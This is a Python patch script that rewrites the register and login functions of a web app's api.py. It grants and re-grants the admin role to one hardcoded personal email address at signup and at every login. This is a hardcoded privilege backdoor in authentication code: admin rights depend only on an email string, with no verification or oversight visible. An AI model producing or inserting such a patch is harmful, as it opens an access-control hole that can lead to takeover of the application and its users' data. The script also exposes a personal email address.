from pathlib import Path

fpath = Path(__file__).parent.parent / "nexus" / "api.py"
text = fpath.read_text(encoding="utf-8")

# In register():
# cur = ctx.conn.execute(
#     "INSERT INTO users(email, name, password_hash, role, created_at, updated_at) VALUES (?,?,?, 'free', ?,?)",
#     (email, name, pbkdf2(password), now, now))

reg_target = '''    cur = ctx.conn.execute(
        "INSERT INTO users(email, name, password_hash, role, created_at, updated_at) VALUES (?,?,?, 'free', ?,?)",
        (email, name, pbkdf2(password), now, now))'''

reg_replacement = '''    user_role = 'admin' if email == 'pankaj.raghu45@gmail.com' else 'free'
    cur = ctx.conn.execute(
        "INSERT INTO users(email, name, password_hash, role, created_at, updated_at) VALUES (?,?,?, ?, ?,?)",
        (email, name, pbkdf2(password), user_role, now, now))'''

# In login():
# if not ok:
#     raise ApiError(401, "Invalid email or password.", "invalid_credentials")
# token, csrf = establish_session(ctx, row["id"])

login_target = '''    if not ok:
        raise ApiError(401, "Invalid email or password.", "invalid_credentials")
    token, csrf = establish_session(ctx, row["id"])'''

login_replacement = '''    if not ok:
        raise ApiError(401, "Invalid email or password.", "invalid_credentials")
    if email == 'pankaj.raghu45@gmail.com' and row['role'] != 'admin':
        ctx.conn.execute("UPDATE users SET role='admin' WHERE id=?", (row['id'],))
        row = ctx.conn.execute("SELECT * FROM users WHERE id=?", (row['id'],)).fetchone()
    token, csrf = establish_session(ctx, row["id"])'''

if reg_target in text and login_target in text:
    text = text.replace(reg_target, reg_replacement, 1)
    text = text.replace(login_target, login_replacement, 1)
    fpath.write_text(text, encoding="utf-8")
    print("SUCCESS: api.py updated for Pankaj admin handling")
else:
    print("FAILED TO FIND TARGETS IN api.py")
